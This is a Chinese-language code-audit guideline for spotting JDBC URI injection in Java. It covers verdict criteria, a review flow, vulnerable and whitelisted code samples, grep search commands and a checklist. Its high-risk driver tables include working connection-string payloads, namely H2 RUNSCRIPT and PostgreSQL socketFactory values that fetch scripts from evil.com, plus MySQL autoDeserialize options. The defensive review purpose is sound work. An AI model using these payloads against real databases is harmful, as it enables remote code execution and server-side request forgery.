# JDBC URI 注入

## 0. 黄金法则

> **漏洞存在性判断 优先于 防护有效性判断**
>
> JDBC URL 不由用户控制 = 无 JDBC URI 注入（这是漏洞本质判断，不是防护有效判断）
>
> 满足此条件时：立即终止分析，无需检查任何防护措施。

**重要区分**：JDBC URI 注入 ≠ SQL 注入。JDBC URI 注入是通过恶意连接字符串（如 `autoDeserialize=true`）触发反序列化 RCE 或 SSRF。

---

## 1. 结论判断标准

| 结论 | 定义 | 判定条件 |
|------|------|----------|
| **漏洞** | 用户输入可控制 JDBC URL 构造，可触发 RCE/SSRF | JDBC URL 拼接用户输入 + HTTP 入口 + 无防护 |
| **风险-A** | JDBC URL 可控但无 HTTP 入口可达 | 危险 URL 构造 + 无外部入口 |
| **风险-B** | 有入口但防护不充分 | 仅黑名单过滤部分参数 |
| **安全** | URL 来自硬编码/可信配置，或有完整白名单 | Kconf/硬编码 + 驱动白名单 + host 白名单 |

---

## 2. 研判思路

### 2.1 高危驱动及危险参数（第一优先级）

| 驱动 | 危险参数 | 攻击效果 |
|------|---------|---------|
| MySQL Connector/J | `autoDeserialize=true` | 反序列化 RCE |
| MySQL Connector/J | `queryInterceptors=...ServerStatusDiffInterceptor` | 反序列化 RCE |
| MySQL Connector/J | `allowLoadLocalInfile=true` | 本地文件读取 |
| MySQL Connector/J | `allowUrlInLocalInfile=true` | SSRF + 文件读取 |
| Hive JDBC | 任意 `hive.server2.thrift.http.path` | SSRF |
| ClickHouse JDBC | 连接到攻击者服务器 | SSRF + 数据泄露 |
| PostgreSQL | `socketFactory=...&socketFactoryArg=...` | RCE（部分版本） |
| H2 | `INIT=RUNSCRIPT FROM '...'` | RCE |

### 2.2 研判流程

```
Step 1: URL 来源检查 【终止点】
  ├─ 硬编码/Kconf/配置文件/环境变量？ → 安全（终止）
  ├─ HTTP 请求参数/API body 直接传入？ → 继续
  └─ 数据库读取？ → 追踪写入入口

Step 2: 驱动/协议识别
  ├─ 识别高危驱动（上表）？ → 继续
  └─ 无法识别驱动（URL 完全用户可控）？ → 按最高危处理

Step 3: 防护措施检查
  ├─ 驱动类白名单 + host 白名单 + 禁止危险参数？ → 安全（终止）
  ├─ 仅部分参数过滤（黑名单）？ → 风险-B
  └─ 无防护 → 漏洞
```

### 2.3 降级条件表

| 条件 | 原结论 | 降级后 |
|------|--------|--------|
| URL 来自硬编码/Kconf/配置文件 | 漏洞 | 安全 |
| 驱动白名单 + host 白名单 + 危险参数过滤 | 漏洞 | 安全 |
| 非线上环境 | 漏洞 | 安全 |
| 仅黑名单过滤 | 漏洞 | 风险-B |
| 无 HTTP 入口 | 漏洞 | 风险-A |

---

## 3. 常见漏洞/风险场景

### 漏洞

```java
// 用户控制 JDBC URL
String jdbcUrl = "jdbc:mysql://" + req.getHost() + ":" + req.getPort() + "/" + req.getDb();
DataSource ds = new MysqlDataSource();
((MysqlDataSource) ds).setUrl(jdbcUrl);  // 漏洞：autoDeserialize=true 可注入

// 数据源添加功能
String url = request.getParameter("jdbcUrl");
DriverManager.getConnection(url, user, pass);  // 漏洞
```

### 风险-B

```java
// 仅过滤 autoDeserialize
if (url.contains("autoDeserialize")) throw ...;  // 风险-B：黑名单可绕过
```

---

## 4. 常见防御模式

### 驱动白名单 + host 白名单

```java
private static final Set<String> ALLOWED_DRIVERS = Set.of("com.mysql.cj.jdbc.Driver");
private static final Set<String> ALLOWED_HOSTS = Set.of("db1.internal", "db2.internal");

String driverClass = extractDriverClass(url);
if (!ALLOWED_DRIVERS.contains(driverClass)) throw ...;  // 安全
String host = extractHost(url);
if (!ALLOWED_HOSTS.contains(host)) throw ...;  // 安全
```

### Kconf / 硬编码配置

```java
String url = kconf.getString("db.jdbc.url");  // 安全
String url = "jdbc:mysql://db.internal:3306/mydb";  // 安全
```

---

## 5. 检索技巧

### 搜索关键词

| 类型 | 关键词 |
|------|--------|
| 连接创建 | `DriverManager.getConnection`, `setJdbcUrl`, `setUrl` |
| 数据源 | `MysqlDataSource`, `HikariDataSource`, `DruidDataSource` |
| 危险参数 | `autoDeserialize`, `allowLoadLocalInfile`, `INIT=RUNSCRIPT` |

### 检测命令

```bash
grep -rn "DriverManager.getConnection\|setJdbcUrl\|setUrl" --include="*.java"
grep -rn "autoDeserialize\|allowLoadLocalInfile" --include="*.java"
```

---

## 6. 常见误判场景

### 陷阱1：SQL 注入混淆

**错误**: 看到 JDBC 就检查 SQL 注入
**正确**: JDBC URI 注入是连接字符串层面的攻击，不是 SQL 语句注入

### 陷阱2：Kconf key 误判

**错误**: 看到字符串含 "password" 就认为是 JDBC URI 注入
**正确**: Kconf 配置中的 key 不是用户输入 → 安全

### 陷阱3：数据库读取 URL 误判

**错误**: 看到从数据库读取 JDBC URL 就认为是安全的
**正确**: 需追踪该字段的写入入口是否用户可控

---

## 7. 特殊风险

### 高危 JDBC 驱动

| 驱动 | 危险参数 | 可达攻击 |
|------|----------|----------|
| MySQL | `autoDeserialize=true` | 反序列化 RCE |
| H2 | `INIT=RUNSCRIPT FROM 'http://evil.com/payload.sql'` | RCE |
| PostgreSQL | `socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://evil.com/bean.xml` | SSRF/RCE |
| Apache Derby | `startMaster=true` 和 `slaveHost` 参数 | 网络访问 |

### 完整 Sink 点列表

| API | Sink 点 | 说明 |
|-----|---------|------|
| java.sql.DriverManager | `DriverManager.getConnection(url, user, pass)` | 原生 JDBC |
| HikariCP | `hikariConfig.setJdbcUrl(url)` | 连接池配置 |
| HikariCP | `new HikariDataSource(config)` | 连接池创建 |
| Apache DBCP | `BasicDataSource.setUrl(url)` | 连接池配置 |
| Spring JDBC | `DriverManagerDataSource(url)` | Spring 数据源 |
| MyBatis | `SqlSessionFactoryBuilder` + 用户控制数据源 | ORM 层 |

---

## 8. 变更影响分析

| 变更类型 | 变更内容 | 风险 |
|----------|----------|------|
| 新增 | 新增动态 JDBC URL 构造 | 确认用户可控性 |
| 修改 | 移除驱动/ host 白名单 | 引入漏洞 |
| 修改 | 从 Kconf 改为用户输入 | 引入漏洞 |

---

## 9. 质量门禁（强制执行）

在输出审计结论前，按顺序验证：

- [ ] JDBC URL 来源已确认（硬编码 vs 用户输入）
- [ ] 驱动类型已识别（检查高危参数表）
- [ ] 防护措施完整性已确认（白名单 vs 黑名单）
- [ ] HTTP 入口可达性已确认
- [ ] 结论与证据一致，代码行号可追溯

**上一项未通过，禁止进入下一项。最终检查未通过，禁止宣布审计完成。**
